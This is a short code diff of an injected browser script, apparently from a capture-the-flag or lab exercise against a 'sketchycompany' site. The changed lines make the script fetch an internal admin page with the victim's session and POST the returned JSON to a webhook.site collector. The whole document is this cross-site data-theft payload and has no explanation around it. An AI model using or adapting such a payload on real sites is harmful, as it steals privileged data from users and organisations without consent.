@@ -5,12 +5,14 @@
 
 
 
-  document.location.href = 'https://internal.sketchycompany.upd-dcs.work/admin';
+  var test = await fetch(`https://internal.sketchycompany.upd-dcs.work/admin`);
+
+  var json = await test.json();
   
   fetch(`https://webhook.site/d32f86da-0fa6-4bca-808c-d1384cbde973`, {
     method: "POST",
-    body: JSON.stringify(document)
-  })
+    body: JSON.stringify(json)
+  });
 
   console.log(doc);
 </script>
